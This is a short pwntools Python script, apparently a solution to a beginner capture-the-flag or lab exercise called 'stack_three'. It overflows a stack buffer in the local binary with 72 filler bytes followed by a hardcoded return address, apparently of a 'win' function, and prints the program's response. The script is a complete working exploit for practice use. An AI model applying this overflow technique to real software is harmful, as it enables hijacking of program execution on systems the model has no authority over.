from pwn import *

p = process("./stack_three")

win_addr = p64(0x0000000000401196)
payload = 'A'*72 + win_addr

p.sendline(payload)
print (p.recvrepeat(1))
